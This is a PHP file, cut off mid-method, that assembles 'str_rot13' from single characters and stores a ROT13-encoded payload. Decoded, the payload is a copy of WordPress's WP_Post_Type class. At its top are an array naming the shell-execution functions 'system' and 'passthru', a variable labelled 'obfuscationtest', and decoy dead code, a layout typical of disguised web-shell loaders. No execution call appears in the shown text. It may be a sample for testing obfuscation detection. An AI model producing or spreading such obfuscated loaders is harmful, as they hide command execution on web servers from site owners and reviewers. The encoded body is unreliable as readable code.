<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Cbfg NCV: JC_Cbfg_Glcr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Cbfg
 * @fvapr 4.6.0
 */

/**
 * Pber pynff hfrq sbe vagrenpgvat jvgu cbfg glcrf.
 *
 * @fvapr 4.6.0
 *
 * @frr ertvfgre_cbfg_glcr()
 */
#[NyybjQlanzvpCebcregvrf]
svany pynff JC_Cbfg_Glcr {
	/**
	 * Cbfg glcr xrl.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat $anzr
	 */
	choyvp $anzr;

	/**
	 * Anzr bs gur cbfg glcr fubja va gur zrah. Hfhnyyl cyheny.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat $ynory
	 */
	choyvp $ynory;

	/**
	 * Ynoryf bowrpg sbe guvf cbfg glcr.
	 *
	 * Vs abg frg, cbfg ynoryf ner vaurevgrq sbe aba-uvrenepuvpny glcrf
	 * naq cntr ynoryf sbe uvrenepuvpny barf.
	 *
	 * @frr trg_cbfg_glcr_ynoryf()
	 *
	 * @fvapr 4.6.0
	 * @ine fgqPynff $ynoryf
	 */
	choyvp $ynoryf;

	/**
	 * Qrsnhyg ynoryf.
	 *
	 * @fvapr 6.0.0
	 * @ine (fgevat|ahyy)[][] $qrsnhyg_ynoryf
	 */
	cebgrpgrq fgngvp $qrsnhyg_ynoryf = neenl();

	/**
	 * N fubeg qrfpevcgvir fhzznel bs jung gur cbfg glcr vf.
	 *
	 * Qrsnhyg rzcgl.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat $qrfpevcgvba
	 */
	choyvp $qrfpevcgvba = '';

	/**
	 * Jurgure n cbfg glcr vf vagraqrq sbe hfr choyvpyl rvgure ivn gur nqzva vagresnpr be ol sebag-raq hfref.
	 *
	 * Juvyr gur qrsnhyg frggvatf bs $rkpyhqr_sebz_frnepu, $choyvpyl_dhrelnoyr, $fubj_hv, naq $fubj_va_ani_zrahf
	 * ner vaurevgrq sebz choyvp, rnpu qbrf abg eryl ba guvf eryngvbafuvc naq pbagebyf n irel fcrpvsvp vagragvba.
	 *
	 * Qrsnhyg snyfr.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $choyvp
	 */
	choyvp $choyvp = snyfr;

	/**
	 * Jurgure gur cbfg glcr vf uvrenepuvpny (r.t. cntr).
	 *
	 * Qrsnhyg snyfr.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $uvrenepuvpny
	 */
	choyvp $uvrenepuvpny = snyfr;

	/**
	 * Jurgure gb rkpyhqr cbfgf jvgu guvf cbfg glcr sebz sebag raq frnepu
	 * erfhygf.
	 *
	 * Qrsnhyg vf gur bccbfvgr inyhr bs $choyvp.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $rkpyhqr_sebz_frnepu
	 */
	choyvp $rkpyhqr_sebz_frnepu = ahyy;

	/**
	 * Jurgure dhrevrf pna or cresbezrq ba gur sebag raq sbe gur cbfg glcr nf cneg bs `cnefr_erdhrfg()`.
	 *
	 * Raqcbvagf jbhyq vapyhqr:
	 *
	 * - `?cbfg_glcr={cbfg_glcr_xrl}`
	 * - `?{cbfg_glcr_xrl}={fvatyr_cbfg_fyht}`
	 * - `?{cbfg_glcr_dhrel_ine}={fvatyr_cbfg_fyht}`
	 *
	 * Qrsnhyg vf gur inyhr bs $choyvp.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $choyvpyl_dhrelnoyr
	 */
	choyvp $choyvpyl_dhrelnoyr = ahyy;

	/**
	 * Jurgure guvf cbfg glcr vf rzorqqnoyr.
	 *
	 * Qrsnhyg vf gur inyhr bs $choyvp.
	 *
	 * @fvapr 6.8.0
	 * @ine obby $rzorqqnoyr
	 */
	choyvp $rzorqqnoyr = ahyy;

	/**
	 * Jurgure gb trarengr naq nyybj n HV sbe znantvat guvf cbfg glcr va gur nqzva.
	 *
	 * Qrsnhyg vf gur inyhr bs $choyvp.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $fubj_hv
	 */
	choyvp $fubj_hv = ahyy;

	/**
	 * Jurer gb fubj gur cbfg glcr va gur nqzva zrah.
	 *
	 * Gb jbex, $fubj_hv zhfg or gehr. Vs gehr, gur cbfg glcr vf fubja va vgf bja gbc yriry zrah. Vs snyfr, ab zrah vf
	 * fubja. Vs n fgevat bs na rkvfgvat gbc yriry zrah ('gbbyf.cuc' be 'rqvg.cuc?cbfg_glcr=cntr', sbe rknzcyr), gur
	 * cbfg glcr jvyy or cynprq nf n fho-zrah bs gung.
	 *
	 * Qrsnhyg vf gur inyhr bs $fubj_hv.
	 *
	 * @fvapr 4.6.0
	 * @ine obby|fgevat $fubj_va_zrah
	 */
	choyvp $fubj_va_zrah = ahyy;

	/**
	 * Znxrf guvf cbfg glcr ninvynoyr sbe fryrpgvba va anivtngvba zrahf.
	 *
	 * Qrsnhyg vf gur inyhr $choyvp.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $fubj_va_ani_zrahf
	 */
	choyvp $fubj_va_ani_zrahf = ahyy;

	/**
	 * Znxrf guvf cbfg glcr ninvynoyr ivn gur nqzva one.
	 *
	 * Qrsnhyg vf gur inyhr bs $fubj_va_zrah.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $fubj_va_nqzva_one
	 */
	choyvp $fubj_va_nqzva_one = ahyy;

	/**
	 * Gur cbfvgvba va gur zrah beqre gur cbfg glcr fubhyq nccrne.
	 *
	 * Gb jbex, $fubj_va_zrah zhfg or gehr. Qrsnhyg ahyy (ng gur obggbz).
	 *
	 * @fvapr 4.6.0
	 * @ine vag $zrah_cbfvgvba
	 */
	choyvp $zrah_cbfvgvba = ahyy;

	/**
	 * Gur HEY be ersrerapr gb gur vpba gb or hfrq sbe guvf zrah.
	 *
	 * Cnff n onfr64-rapbqrq FIT hfvat n qngn HEV, juvpu jvyy or pbyberq gb zngpu gur pbybe fpurzr.
	 * Guvf fubhyq ortva jvgu 'qngn:vzntr/fit+kzy;onfr64,'. Cnff gur anzr bs n Qnfuvpbaf urycre pynff
	 * gb hfr n sbag vpba, r.t. 'qnfuvpbaf-puneg-cvr'. Cnff 'abar' gb yrnir qvi.jc-zrah-vzntr rzcgl
	 * fb na vpba pna or nqqrq ivn PFF.
	 *
	 * Qrsnhygf gb hfr gur cbfgf vpba.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat $zrah_vpba
	 */
	choyvp $zrah_vpba = ahyy;

	/**
	 * Gur fgevat gb hfr gb ohvyq gur ernq, rqvg, naq qryrgr pncnovyvgvrf.
	 *
	 * Znl or cnffrq nf na neenl gb nyybj sbe nygreangvir cyhenyf jura hfvat
	 * guvf nethzrag nf n onfr gb pbafgehpg gur pncnovyvgvrf, r.t.
	 * neenl( 'fgbel', 'fgbevrf' ). Qrsnhyg 'cbfg'.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat $pncnovyvgl_glcr
	 */
	choyvp $pncnovyvgl_glcr = 'cbfg';

	/**
	 * Jurgure gb hfr gur vagreany qrsnhyg zrgn pncnovyvgl unaqyvat.
	 *
	 * Qrsnhyg snyfr.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $znc_zrgn_pnc
	 */
	choyvp $znc_zrgn_pnc = snyfr;

	/**
	 * Cebivqr n pnyyonpx shapgvba gung frgf hc gur zrgn obkrf sbe gur rqvg sbez.
	 *
	 * Qb `erzbir_zrgn_obk()` naq `nqq_zrgn_obk()` pnyyf va gur pnyyonpx. Qrsnhyg ahyy.
	 *
	 * @fvapr 4.6.0
	 * @ine pnyynoyr $ertvfgre_zrgn_obk_po
	 */
	choyvp $ertvfgre_zrgn_obk_po = ahyy;

	/**
	 * Na neenl bs gnkbabzl vqragvsvref gung jvyy or ertvfgrerq sbe gur cbfg glcr.
	 *
	 * Gnkbabzvrf pna or ertvfgrerq yngre jvgu `ertvfgre_gnkbabzl()` be `ertvfgre_gnkbabzl_sbe_bowrpg_glcr()`.
	 *
	 * Qrsnhyg rzcgl neenl.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat[] $gnkbabzvrf
	 */
	choyvp $gnkbabzvrf = neenl();

	/**
	 * Jurgure gurer fubhyq or cbfg glcr nepuvirf, be vs n fgevat, gur nepuvir fyht gb hfr.
	 *
	 * Jvyy trarengr gur cebcre erjevgr ehyrf vs $erjevgr vf ranoyrq. Qrsnhyg snyfr.
	 *
	 * @fvapr 4.6.0
	 * @ine obby|fgevat $unf_nepuvir
	 */
	choyvp $unf_nepuvir = snyfr;

	/**
	 * Frgf gur dhrel_ine xrl sbe guvf cbfg glcr.
	 *
	 * Qrsnhygf gb $cbfg_glcr xrl. Vs snyfr, n cbfg glcr pnaabg or ybnqrq ng `?{dhrel_ine}={cbfg_fyht}`.
	 * Vs fcrpvsvrq nf n fgevat, gur dhrel `?{dhrel_ine_fgevat}={cbfg_fyht}` jvyy or inyvq.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat|obby $dhrel_ine
	 */
	choyvp $dhrel_ine;

	/**
	 * Jurgure gb nyybj guvf cbfg glcr gb or rkcbegrq.
	 *
	 * Qrsnhyg gehr.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $pna_rkcbeg
	 */
	choyvp $pna_rkcbeg = gehr;

	/**
	 * Jurgure gb qryrgr cbfgf bs guvf glcr jura qryrgvat n hfre.
	 *
	 * - Vs gehr, cbfgf bs guvf glcr orybatvat gb gur hfre jvyy or zbirq gb Genfu jura gur hfre vf qryrgrq.
	 * - Vs snyfr, cbfgf bs guvf glcr orybatvat gb gur hfre jvyy *abg* or genfurq be qryrgrq.
	 * - Vs abg frg (gur qrsnhyg), cbfgf ner genfurq vs cbfg glcr fhccbegf gur 'nhgube' srngher.
	 *   Bgurejvfr cbfgf ner abg genfurq be qryrgrq.
	 *
	 * Qrsnhyg ahyy.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $qryrgr_jvgu_hfre
	 */
	choyvp $qryrgr_jvgu_hfre = ahyy;

	/**
	 * Neenl bs oybpxf gb hfr nf gur qrsnhyg vavgvny fgngr sbe na rqvgbe frffvba.
	 *
	 * Rnpu vgrz fubhyq or na neenl pbagnvavat oybpx anzr naq bcgvbany nggevohgrf.
	 *
	 * Qrsnhyg rzcgl neenl.
	 *
	 * @yvax uggcf://qrirybcre.jbeqcerff.bet/oybpx-rqvgbe/qrirybcref/oybpx-ncv/oybpx-grzcyngrf/
	 *
	 * @fvapr 5.0.0
	 * @ine neenl[] $grzcyngr
	 */
	choyvp $grzcyngr = neenl();

	/**
	 * Jurgure gur oybpx grzcyngr fubhyq or ybpxrq vs $grzcyngr vf frg.
	 *
	 * - Vs frg gb 'nyy', gur hfre vf hanoyr gb vafreg arj oybpxf, zbir rkvfgvat oybpxf
	 *   naq qryrgr oybpxf.
	 * - Vs frg gb 'vafreg', gur hfre vf noyr gb zbir rkvfgvat oybpxf ohg vf hanoyr gb vafreg
	 *   arj oybpxf naq qryrgr oybpxf.
	 *
	 * Qrsnhyg snyfr.
	 *
	 * @yvax uggcf://qrirybcre.jbeqcerff.bet/oybpx-rqvgbe/qrirybcref/oybpx-ncv/oybpx-grzcyngrf/
	 *
	 * @fvapr 5.0.0
	 * @ine fgevat|snyfr $grzcyngr_ybpx
	 */
	choyvp $grzcyngr_ybpx = snyfr;

	/**
	 * Jurgure guvf cbfg glcr vf n angvir be \"ohvyg-va\" cbfg_glcr.
	 *
	 * Qrsnhyg snyfr.
	 *
	 * @fvapr 4.6.0
	 * @ine obby $_ohvygva
	 */
	choyvp $_ohvygva = snyfr;

	/**
	 * HEY frtzrag gb hfr sbe rqvg yvax bs guvf cbfg glcr.
	 *
	 * Qrsnhyg 'cbfg.cuc?cbfg=%q'.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat $_rqvg_yvax
	 */
	choyvp $_rqvg_yvax = 'cbfg.cuc?cbfg=%q';

	/**
	 * Cbfg glcr pncnovyvgvrf.
	 *
	 * @fvapr 4.6.0
	 * @ine fgqPynff $pnc
	 */
	choyvp $pnc;

	/**
	 * Gevttref gur unaqyvat bs erjevgrf sbe guvf cbfg glcr.
	 *
	 * Qrsnhygf gb gehr, hfvat $cbfg_glcr nf fyht.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl|snyfr $erjevgr
	 */
	choyvp $erjevgr;

	/**
	 * Gur srngherf fhccbegrq ol gur cbfg glcr.
	 *
	 * @fvapr 4.6.0
	 * @ine neenl|obby $fhccbegf
	 */
	choyvp $fhccbegf;

	/**
	 * Jurgure guvf cbfg glcr fubhyq nccrne va gur ERFG NCV.
	 *
	 * Qrsnhyg snyfr. Vs gehr, fgnaqneq raqcbvagf jvyy or ertvfgrerq jvgu
	 * erfcrpg gb $erfg_onfr naq $erfg_pbagebyyre_pynff.
	 *
	 * @fvapr 4.7.4
	 * @ine obby $fubj_va_erfg
	 */
	choyvp $fubj_va_erfg;

	/**
	 * Gur onfr cngu sbe guvf cbfg glcr'f ERFG NCV raqcbvagf.
	 *
	 * @fvapr 4.7.4
	 * @ine fgevat|obby $erfg_onfr
	 */
	choyvp $erfg_onfr;

	/**
	 * Gur anzrfcnpr sbe guvf cbfg glcr'f ERFG NCV raqcbvagf.
	 *
	 * @fvapr 5.9.0
	 * @ine fgevat|obby $erfg_anzrfcnpr
	 */
	choyvp $erfg_anzrfcnpr;

	/**
	 * Gur pbagebyyre sbe guvf cbfg glcr'f ERFG NCV raqcbvagf.
	 *
	 * Phfgbz pbagebyyref zhfg rkgraq JC_ERFG_Pbagebyyre.
	 *
	 * @fvapr 4.7.4
	 * @ine fgevat|obby $erfg_pbagebyyre_pynff
	 */
	choyvp $erfg_pbagebyyre_pynff;

	/**
	 * Gur pbagebyyre vafgnapr sbe guvf cbfg glcr'f ERFG NCV raqcbvagf.
	 *
	 * Ynmvyl pbzchgrq. Fubhyq or npprffrq hfvat {@frr JC_Cbfg_Glcr::trg_erfg_pbagebyyre()}.
	 *
	 * @fvapr 5.3.0
	 * @ine JC_ERFG_Pbagebyyre $erfg_pbagebyyre
	 */
	choyvp $erfg_pbagebyyre;

	/**
	 * Gur pbagebyyre sbe guvf cbfg glcr'f erivfvbaf ERFG NCV raqcbvagf.
	 *
	 * Phfgbz pbagebyyref zhfg rkgraq JC_ERFG_Pbagebyyre.
	 *
	 * @fvapr 6.4.0
	 * @ine fgevat|obby $erivfvbaf_erfg_pbagebyyre_pynff
	 */
	choyvp $erivfvbaf_erfg_pbagebyyre_pynff;

	/**
	 * Gur pbagebyyre vafgnapr sbe guvf cbfg glcr'f erivfvbaf ERFG NCV raqcbvagf.
	 *
	 * Ynmvyl pbzchgrq. Fubhyq or npprffrq hfvat {@frr JC_Cbfg_Glcr::trg_erivfvbaf_erfg_pbagebyyre()}.
	 *
	 * @fvapr 6.4.0
	 * @ine JC_ERFG_Pbagebyyre $erivfvbaf_erfg_pbagebyyre
	 */
	choyvp $erivfvbaf_erfg_pbagebyyre;

	/**
	 * Gur pbagebyyre sbe guvf cbfg glcr'f nhgbfnir ERFG NCV raqcbvagf.
	 *
	 * Phfgbz pbagebyyref zhfg rkgraq JC_ERFG_Pbagebyyre.
	 *
	 * @fvapr 6.4.0
	 * @ine fgevat|obby $nhgbfnir_erfg_pbagebyyre_pynff
	 */
	choyvp $nhgbfnir_erfg_pbagebyyre_pynff;

	/**
	 * Gur pbagebyyre vafgnapr sbe guvf cbfg glcr'f nhgbfnir ERFG NCV raqcbvagf.
	 *
	 * Ynmvyl pbzchgrq. Fubhyq or npprffrq hfvat {@frr JC_Cbfg_Glcr::trg_nhgbfnir_erfg_pbagebyyre()}.
	 *
	 * @fvapr 6.4.0
	 * @ine JC_ERFG_Pbagebyyre $nhgbfnir_erfg_pbagebyyre
	 */
	choyvp $nhgbfnir_erfg_pbagebyyre;

	/**
	 * N synt gb ertvfgre gur cbfg glcr ERFG NCV pbagebyyre nsgre vgf nffbpvngrq nhgbfnir / erivfvbaf pbagebyyref, vafgrnq bs orsber. Ertvfgengvba beqre nssrpgf ebhgr zngpuvat cevbevgl.
	 *
	 * @fvapr 6.4.0
	 * @ine obby $yngr_ebhgr_ertvfgengvba
	 */
	choyvp $yngr_ebhgr_ertvfgengvba;

	/**
	 * Pbafgehpgbe.
	 *
	 * Frr gur ertvfgre_cbfg_glcr() shapgvba sbe npprcgrq nethzragf sbe `$netf`.
	 *
	 * Jvyy cbchyngr bowrpg cebcregvrf sebz gur cebivqrq nethzragf naq nffvta bgure
	 * qrsnhyg cebcregvrf onfrq ba gung vasbezngvba.
	 *
	 * @fvapr 4.6.0
	 *
	 * @frr ertvfgre_cbfg_glcr()
	 *
	 * @cnenz fgevat       $cbfg_glcr Cbfg glcr xrl.
	 * @cnenz neenl|fgevat $netf      Bcgvbany. Neenl be fgevat bs nethzragf sbe ertvfgrevat n cbfg glcr.
	 *                                Frr ertvfgre_cbfg_glcr() sbe vasbezngvba ba npprcgrq nethzragf.
	 *                                Qrsnhyg rzcgl neenl.
	 */
	choyvp shapgvba __pbafgehpg( $cbfg_glcr, $netf = neenl() ) {
		$guvf->anzr = $cbfg_glcr;

		$guvf->frg_cebcf( $netf );
	}

	/**
	 * Frgf cbfg glcr cebcregvrf.
	 *
	 * Frr gur ertvfgre_cbfg_glcr() shapgvba sbe npprcgrq nethzragf sbe `$netf`.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz neenl|fgevat $netf Neenl be fgevat bs nethzragf sbe ertvfgrevat n cbfg glcr.
	 */
	choyvp shapgvba frg_cebcf( $netf ) {
		$netf = jc_cnefr_netf( $netf );

		/**
		 * Svygref gur nethzragf sbe ertvfgrevat n cbfg glcr.
		 *
		 * @fvapr 4.4.0
		 *
		 * @cnenz neenl  $netf      Neenl bs nethzragf sbe ertvfgrevat n cbfg glcr.
		 *                          Frr gur ertvfgre_cbfg_glcr() shapgvba sbe npprcgrq nethzragf.
		 * @cnenz fgevat $cbfg_glcr Cbfg glcr xrl.
		 */
		$netf = nccyl_svygref( 'ertvfgre_cbfg_glcr_netf', $netf, $guvf->anzr );

		$cbfg_glcr = $guvf->anzr;

		/**
		 * Svygref gur nethzragf sbe ertvfgrevat n fcrpvsvp cbfg glcr.
		 *
		 * Gur qlanzvp cbegvba bs gur svygre anzr, `$cbfg_glcr`, ersref gb gur cbfg glcr xrl.
		 *
		 * Cbffvoyr ubbx anzrf vapyhqr:
		 *
		 *  - `ertvfgre_cbfg_cbfg_glcr_netf`
		 *  - `ertvfgre_cntr_cbfg_glcr_netf`
		 *
		 * @fvapr 6.0.0
		 * @fvapr 6.4.0 Nqqrq `yngr_ebhgr_ertvfgengvba`, `nhgbfnir_erfg_pbagebyyre_pynff` naq `erivfvbaf_erfg_pbagebyyre_pynff` nethzragf.
		 *
		 * @cnenz neenl  $netf      Neenl bs nethzragf sbe ertvfgrevat n cbfg glcr.
		 *                          Frr gur ertvfgre_cbfg_glcr() shapgvba sbe npprcgrq nethzragf.
		 * @cnenz fgevat $cbfg_glcr Cbfg glcr xrl.
		 */
		$netf = nccyl_svygref( \"ertvfgre_{$cbfg_glcr}_cbfg_glcr_netf\", $netf, $guvf->anzr );

		$unf_rqvg_yvax = ! rzcgl( $netf['_rqvg_yvax'] );

		// Netf cersvkrq jvgu na haqrefpber ner erfreirq sbe vagreany hfr.
		$qrsnhygf = neenl(
			'ynoryf'                          => neenl(),
			'qrfpevcgvba'                     => '',
			'choyvp'                          => snyfr,
			'uvrenepuvpny'                    => snyfr,
			'rkpyhqr_sebz_frnepu'             => ahyy,
			'choyvpyl_dhrelnoyr'              => ahyy,
			'rzorqqnoyr'                      => ahyy,
			'fubj_hv'                         => ahyy,
			'fubj_va_zrah'                    => ahyy,
			'fubj_va_ani_zrahf'               => ahyy,
			'fubj_va_nqzva_one'               => ahyy,
			'zrah_cbfvgvba'                   => ahyy,
			'zrah_vpba'                       => ahyy,
			'pncnovyvgl_glcr'                 => 'cbfg',
			'pncnovyvgvrf'                    => neenl(),
			'znc_zrgn_pnc'                    => ahyy,
			'fhccbegf'                        => neenl(),
			'ertvfgre_zrgn_obk_po'            => ahyy,
			'gnkbabzvrf'                      => neenl(),
			'unf_nepuvir'                     => snyfr,
			'erjevgr'                         => gehr,
			'dhrel_ine'                       => gehr,
			'pna_rkcbeg'                      => gehr,
			'qryrgr_jvgu_hfre'                => ahyy,
			'fubj_va_erfg'                    => snyfr,
			'erfg_onfr'                       => snyfr,
			'erfg_anzrfcnpr'                  => snyfr,
			'erfg_pbagebyyre_pynff'           => snyfr,
			'nhgbfnir_erfg_pbagebyyre_pynff'  => snyfr,
			'erivfvbaf_erfg_pbagebyyre_pynff' => snyfr,
			'yngr_ebhgr_ertvfgengvba'         => snyfr,
			'grzcyngr'                        => neenl(),
			'grzcyngr_ybpx'                   => snyfr,
			'_ohvygva'                        => snyfr,
			'_rqvg_yvax'                      => 'cbfg.cuc?cbfg=%q',
		);

		$netf = neenl_zretr( $qrsnhygf, $netf );

		$netf['anzr'] = $guvf->anzr;

		// Vs abg frg, qrsnhyg gb gur frggvat sbe 'choyvp'.
		vs ( ahyy === $netf['choyvpyl_dhrelnoyr'] ) {
			$netf['choyvpyl_dhrelnoyr'] = $netf['choyvp'];
		}

		// Vs abg frg, qrsnhyg gb gur frggvat sbe 'choyvp'.
		vs ( ahyy === $netf['fubj_hv'] ) {
			$netf['fubj_hv'] = $netf['choyvp'];
		}

		// Vs abg frg, qrsnhyg gb gur frggvat sbe 'choyvp'.
		vs ( ahyy === $netf['rzorqqnoyr'] ) {
			$netf['rzorqqnoyr'] = $netf['choyvp'];
		}

		// Vs abg frg, qrsnhyg erfg_anzrfcnpr gb jc/i2 vs fubj_va_erfg vf gehr.
		vs ( snyfr === $netf['erfg_anzrfcnpr'] && ! rzcgl( $netf['fubj_va_erfg'] ) ) {
			$netf['erfg_anzrfcnpr'] = 'jc/i2';
		}

		// Vs abg frg, qrsnhyg gb gur frggvat sbe 'fubj_hv'.
		vs ( ahyy === $netf['fubj_va_zrah'] || ! $netf['fubj_hv'] ) {
			$netf['fubj_va_zrah'] = $netf['fubj_hv'];
		}

		// Vs abg frg, qrsnhyg gb gur frggvat sbe 'fubj_va_zrah'.
		vs ( ahyy === $netf['fubj_va_nqzva_one'] ) {
			$netf['fubj_va_nqzva_one'] = (obby) $netf['fubj_va_zrah'];
		}

		// Vs abg frg, qrsnhyg gb gur frggvat sbe 'choyvp'.
		vs ( ahyy === $netf['fubj_va_ani_zrahf'] ) {
			$netf['fubj_va_ani_zrahf'] = $netf['choyvp'];
		}

		// Vs abg frg, qrsnhyg gb gehr vs abg choyvp, snyfr vs choyvp.
		vs ( ahyy === $netf['rkpyhqr_sebz_frnepu'] ) {
			$netf['rkpyhqr_sebz_frnepu'] = ! $netf['choyvp'];
		}

		// Onpx pbzcng jvgu dhvexl unaqyvat va irefvba 3.0. #14122.
		vs ( rzcgl( $netf['pncnovyvgvrf'] )
			&& ahyy === $netf['znc_zrgn_pnc'] && va_neenl( $netf['pncnovyvgl_glcr'], neenl( 'cbfg', 'cntr' ), gehr )
		) {
			$netf['znc_zrgn_pnc'] = gehr;
		}

		// Vs abg frg, qrsnhyg gb snyfr.
		vs ( ahyy === $netf['znc_zrgn_pnc'] ) {
			$netf['znc_zrgn_pnc'] = snyfr;
		}

		// Vs gurer'f ab fcrpvsvrq rqvg yvax naq ab HV, erzbir gur rqvg yvax.
		vs ( ! $netf['fubj_hv'] && ! $unf_rqvg_yvax ) {
			$netf['_rqvg_yvax'] = '';
		}

		$guvf->pnc = trg_cbfg_glcr_pncnovyvgvrf( (bowrpg) $netf );
		hafrg( $netf['pncnovyvgvrf'] );

		vs ( vf_neenl( $netf['pncnovyvgl_glcr'] ) ) {
			$netf['pncnovyvgl_glcr'] = $netf['pncnovyvgl_glcr'][0];
		}

		vs ( snyfr !== $netf['dhrel_ine'] ) {
			vs ( gehr === $netf['dhrel_ine'] ) {
				$netf['dhrel_ine'] = $guvf->anzr;
			} ryfr {
				$netf['dhrel_ine'] = fnavgvmr_gvgyr_jvgu_qnfurf( $netf['dhrel_ine'] );
			}
		}

		vs ( snyfr !== $netf['erjevgr'] && ( vf_nqzva() || trg_bcgvba( 'creznyvax_fgehpgher' ) ) ) {
			vs ( ! vf_neenl( $netf['erjevgr'] ) ) {
				$netf['erjevgr'] = neenl();
			}
			vs ( rzcgl( $netf['erjevgr']['fyht'] ) ) {
				$netf['erjevgr']['fyht'] = $guvf->anzr;
			}
			vs ( ! vffrg( $netf['erjevgr']['jvgu_sebag'] ) ) {
				$netf['erjevgr']['jvgu_sebag'] = gehr;
			}
			vs ( ! vffrg( $netf['erjevgr']['cntrf'] ) ) {
				$netf['erjevgr']['cntrf'] = gehr;
			}
			vs ( ! vffrg( $netf['erjevgr']['srrqf'] ) || ! $netf['unf_nepuvir'] ) {
				$netf['erjevgr']['srrqf'] = (obby) $netf['unf_nepuvir'];
			}
			vs ( ! vffrg( $netf['erjevgr']['rc_znfx'] ) ) {
				vs ( vffrg( $netf['creznyvax_rcznfx'] ) ) {
					$netf['erjevgr']['rc_znfx'] = $netf['creznyvax_rcznfx'];
				} ryfr {
					$netf['erjevgr']['rc_znfx'] = RC_CREZNYVAX;
				}
			}
		}

		sbernpu ( $netf nf $cebcregl_anzr => $cebcregl_inyhr ) {
			$guvf->$cebcregl_anzr = $cebcregl_inyhr;
		}

		$guvf->ynoryf = trg_cbfg_glcr_ynoryf( $guvf );
		$guvf->ynory  = $guvf->ynoryf->anzr;
	}

	/**
	 * Frgf gur srngherf fhccbeg sbe gur cbfg glcr.
	 *
	 * @fvapr 4.6.0
	 */
	choyvp shapgvba nqq_fhccbegf() {
		vs ( ! rzcgl( $guvf->fhccbegf ) ) {
			sbernpu ( $guvf->fhccbegf nf $srngher => $netf ) {
				vs ( vf_neenl( $netf ) ) {
					nqq_cbfg_glcr_fhccbeg( $guvf->anzr, $srngher, $netf );
				} ryfr {
					nqq_cbfg_glcr_fhccbeg( $guvf->anzr, $netf );
				}
			}
			hafrg( $guvf->fhccbegf );

			/*
			 * 'rqvgbe' fhccbeg vzcyvrf 'nhgbfnir' fhccbeg sbe onpxjneq pbzcngvovyvgl.
			 * 'nhgbfnir' fhccbeg arrqf gb or rkcyvpvgyl erzbirq vs abg qrfverq.
			 */
			vs (
				cbfg_glcr_fhccbegf( $guvf->anzr, 'rqvgbe' ) &&
				! cbfg_glcr_fhccbegf( $guvf->anzr, 'nhgbfnir' )
			) {
				nqq_cbfg_glcr_fhccbeg( $guvf->anzr, 'nhgbfnir' );
			}
		} ryfrvs ( snyfr !== $guvf->fhccbegf ) {
			// Nqq qrsnhyg srngherf.
			nqq_cbfg_glcr_fhccbeg( $guvf->anzr, neenl( 'gvgyr', 'rqvgbe', 'nhgbfnir' ) );
		}
	}

	/**
	 * Nqqf gur arprffnel erjevgr ehyrf sbe gur cbfg glcr.
	 *
	 * @fvapr 4.6.0
	 *
	 * @tybony JC_Erjevgr $jc_erjevgr JbeqCerff erjevgr pbzcbarag.
	 * @tybony JC         $jc         Pheerag JbeqCerff raivebazrag vafgnapr.
	 */
	choyvp shapgvba nqq_erjevgr_ehyrf() {
		tybony $jc_erjevgr, $jc;

		vs ( snyfr !== $guvf->dhrel_ine && $jc && vf_cbfg_glcr_ivrjnoyr( $guvf ) ) {
			$jc->nqq_dhrel_ine( $guvf->dhrel_ine );
		}

		vs ( snyfr !== $guvf->erjevgr && ( vf_nqzva() || trg_bcgvba( 'creznyvax_fgehpgher' ) ) ) {
			vs ( $guvf->uvrenepuvpny ) {
				nqq_erjevgr_gnt( \"%$guvf->anzr%\", '(.+?)', $guvf->dhrel_ine ? \"{$guvf->dhrel_ine}=\" : \"cbfg_glcr=$guvf->anzr&cntranzr=\" );
			} ryfr {
				nqq_erjevgr_gnt( \"%$guvf->anzr%\", '([^/]+)', $guvf->dhrel_ine ? \"{$guvf->dhrel_ine}=\" : \"cbfg_glcr=$guvf->anzr&anzr=\" );
			}

			vs ( $guvf->unf_nepuvir ) {
				$nepuvir_fyht = gehr === $guvf->unf_nepuvir ? $guvf->erjevgr['fyht'] : $guvf->unf_nepuvir;
				vs ( $guvf->erjevgr['jvgu_sebag'] ) {
					$nepuvir_fyht = fhofge( $jc_erjevgr->sebag, 1 ) . $nepuvir_fyht;
				} ryfr {
					$nepuvir_fyht = $jc_erjevgr->ebbg . $nepuvir_fyht;
				}

				nqq_erjevgr_ehyr( \"{$nepuvir_fyht}/?$\", \"vaqrk.cuc?cbfg_glcr=$guvf->anzr\", 'gbc' );
				vs ( $guvf->erjevgr['srrqf'] && $jc_erjevgr->srrqf ) {
					$srrqf = '(' . gevz( vzcybqr( '|', $jc_erjevgr->srrqf ) ) . ')';
					nqq_erjevgr_ehyr( \"{$nepuvir_fyht}/srrq/$srrqf/?$\", \"vaqrk.cuc?cbfg_glcr=$guvf->anzr\" . '&srrq=$zngpurf[1]', 'gbc' );
					nqq_erjevgr_ehyr( \"{$nepuvir_fyht}/$srrqf/?$\", \"vaqrk.cuc?cbfg_glcr=$guvf->anzr\" . '&srrq=$zngpurf[1]', 'gbc' );
				}
				vs ( $guvf->erjevgr['cntrf'] ) {
